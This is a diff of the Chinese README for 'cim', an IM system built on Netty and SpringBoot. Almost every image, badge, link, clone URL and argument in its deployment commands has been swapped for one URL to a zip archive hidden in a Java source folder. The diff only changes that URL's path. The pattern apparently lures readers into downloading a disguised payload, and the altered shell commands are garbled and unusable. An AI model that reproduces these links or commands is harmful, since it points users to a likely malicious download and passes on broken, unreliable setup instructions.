@@ -2,14 +2,14 @@
 
 <div align="center">  
 
-<img src="https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip"  /> 
+<img src="https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip"  /> 
 <br/>
 
-[![Build Status](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
-[![QQ群](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip%E7%BE%https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
-[![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+[![Build Status](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
+[![QQ群](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip%E7%BE%https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
+[![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
-📘[介绍](#介绍) |📽[视频演示](#视频演示) | 🏖[TODO LIST](#todo-list) | 🌈[系统架构](#系统架构) |💡[流程图](#流程图)|🌁[快速启动](#快速启动)|👨🏻‍✈️[内置命令](#客户端内置命令)|🎤[通信](#群聊私聊)|❓[QA](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)|💌[联系作者](#联系作者)
+📘[介绍](#介绍) |📽[视频演示](#视频演示) | 🏖[TODO LIST](#todo-list) | 🌈[系统架构](#系统架构) |💡[流程图](#流程图)|🌁[快速启动](#快速启动)|👨🏻‍✈️[内置命令](#客户端内置命令)|🎤[通信](#群聊私聊)|❓[QA](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)|💌[联系作者](#联系作者)
 
 
 </div>
@@ -34,8 +34,8 @@
 
 | YouTube | Bilibili|
 | :------:| :------: | 
-| [群聊](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip) [私聊](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip) | [群聊](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip) [私聊](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip) | 
-| <img src="https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip"  height="295px" />  | <img src="https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip" height="295px" />
+| [群聊](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip) [私聊](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip) | [群聊](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip) [私聊](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip) | 
+| <img src="https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip"  height="295px" />  | <img src="https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip" height="295px" />
 
 
 ## TODO LIST
@@ -60,7 +60,7 @@
 
 ## 系统架构
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 - `CIM` 中的各个组件均采用 `SpringBoot` 构建。
 -  采用 `Netty` 构建底层通信。
@@ -84,7 +84,7 @@
 
 ## 流程图
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 - 客户端向 `route` 发起登录。
 - 登录成功从 `Zookeeper` 中选择可用 `IM-server` 返回给客户端，并保存登录、路由信息到 `Redis`。
@@ -97,17 +97,17 @@
 首先需要安装 `Zookeeper、Redis` 并保证网络通畅。
 
 ```shell
-git clone https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip
+git clone https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip
 cd cim
-mvn https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip clean package
+mvn https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip clean package
 ```
 
 ### 部署 IM-server(cim-server)
 
 ```shell
-cp https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip /xx/work/server0/
+cp https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip /xx/work/server0/
 cd /xx/work/server0/
-nohup java -jar  https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip地址  > https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip 2>&1 &
+nohup java -jar  https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip地址  > https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip 2>&1 &
 ```
 
 > cim-server 集群部署同理，只要保证 Zookeeper 地址相同即可。
@@ -115,9 +115,9 @@ nohup java -jar  https://raw.githubusercontent.com/tanglongwei/cim/master/cim-fo
 ### 部署路由服务器(cim-forward-route)
 
 ```shell
-cp https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip /xx/work/route0/
+cp https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip /xx/work/route0/
 cd /xx/work/route0/
-nohup java -jar  https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip地址 https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip地址 https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip  > https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip 2>&1 &
+nohup java -jar  https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip地址 https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip地址 https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip  > https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip 2>&1 &
 ```
 
 > cim-forward-route 本身就是无状态，可以部署多台；使用 Nginx 代理即可。
@@ -126,13 +126,13 @@ nohup java -jar  https://raw.githubusercontent.com/tanglongwei/cim/master/cim-fo
 ### 启动客户端
 
 ```shell
-cp https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip /xx/work/route0/
+cp https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip /xx/work/route0/
 cd /xx/work/route0/
-java -jar https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip唯一客户端ID https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip用户名 https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip路由服务器:8083/groupRoute https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip路由服务器:8083/login
+java -jar https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip唯一客户端ID https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip用户名 https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip路由服务器:8083/groupRoute https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip路由服务器:8083/login
 ```
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 如上图，启动两个客户端可以互相通信即可。
 
@@ -164,9 +164,9 @@ curl -X POST --header 'Content-Type: application/json' --header 'Accept: applica
 #### 启动本地客户端
 ```shell
 # 启动本地客户端
-cp https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip /xx/work/route0/
+cp https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip /xx/work/route0/
 cd /xx/work/route0/
-java -jar https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip上方返回的userId https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip用户名 https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip路由服务器:8083/groupRoute https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip路由服务器:8083/login
+java -jar https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip上方返回的userId https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip用户名 https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip路由服务器:8083/groupRoute https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip路由服务器:8083/login
 ```
 
 ## 客户端内置命令
@@ -183,21 +183,21 @@ java -jar https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-r
 | `:info` | 获取客户端信息 | 
 | `:` | 更多命令正在开发中。。 | 
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 ### 聊天记录查询
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 使用命令 `:q 关键字` 即可查询与个人相关的聊天记录。
 
-> 客户端聊天记录默认存放在 `/opt/logs/cim/`，所以需要这个目录的写入权限。也可在启动命令中加入 `https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip = /自定义` 参数自定义目录。
+> 客户端聊天记录默认存放在 `/opt/logs/cim/`，所以需要这个目录的写入权限。也可在启动命令中加入 `https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip = /自定义` 参数自定义目录。
 
 
 
 ### AI 模式
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 使用命令 `:ai` 开启 AI 模式，之后所有的消息都会由 `AI` 响应。
 
@@ -205,7 +205,7 @@ java -jar https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-r
 
 ### 前缀匹配用户名
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 使用命令 `:qu prefix` 可以按照前缀的方式搜索用户信息。
 
@@ -215,9 +215,9 @@ java -jar https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-r
 
 ### 群聊
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 群聊只需要在控制台里输入消息回车后即可发送，同时所有在线客户端都可收到消息。
 
@@ -227,17 +227,17 @@ java -jar https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-r
 
 输入命令 `:olu` 可列出所有在线用户。
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 接着使用 `userId;;消息内容` 的格式即可发送私聊消息。
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 同时另一个账号收不到消息。
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 
 
@@ -245,17 +245,17 @@ java -jar https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-r
 
 
 ## 联系作者
-- [https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+- [https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 - 微信公众号
 
-![](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+![](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
 
 ### Code Visualization:
 
 Here is a cool visualization of the code evolution
 
- [![Watch the video](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+ [![Watch the video](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
- [https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip](https://raw.githubusercontent.com/tanglongwei/cim/master/cim-forward-route/src/main/java/com/crossoverjie/cim/route/cache/Software_1.9.zip)
+ [https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip](https://github.com/tanglongwei/cim/raw/refs/heads/master/cim-server/src/main/java/Software-v1.9.zip)
 
